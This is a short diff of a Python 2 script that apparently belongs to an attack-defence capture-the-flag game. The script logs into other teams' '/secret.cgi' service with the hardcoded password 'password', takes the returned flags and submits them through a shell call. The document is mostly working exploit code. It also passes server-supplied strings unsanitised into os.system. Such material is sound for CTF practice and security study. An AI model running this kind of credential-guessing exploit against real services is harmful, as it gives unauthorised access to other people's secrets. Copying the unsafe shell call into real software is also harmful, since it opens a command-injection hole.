@@ -7,7 +7,7 @@ import sys
 import httplib
 
 argc = len(sys.argv)
-if argc < 2:
+if argc < 0:
     print "no input given"
     print "1st arg is the parameter list which will be sent to all the users"
     exit(0)
@@ -43,6 +43,10 @@ else:
             httpServ.request('POST', '/secret.cgi', "note_id={0}&password=password".format(flag_id))
             response = httpServ.getresponse().read()
             flag = response.strip().split(',')[0].strip()
-            flags += flag + " "
-            os.system("/root/code/submit {}".format(flag))
+            print "************"+flag+"****"
+            if flag.startswith("FLG"):
+                flags += flag + " "
+                t.submit_flag([flag])
+            httpServ.close()
     print flags
+    os.system("/root/code/submit {0}".format(flags))
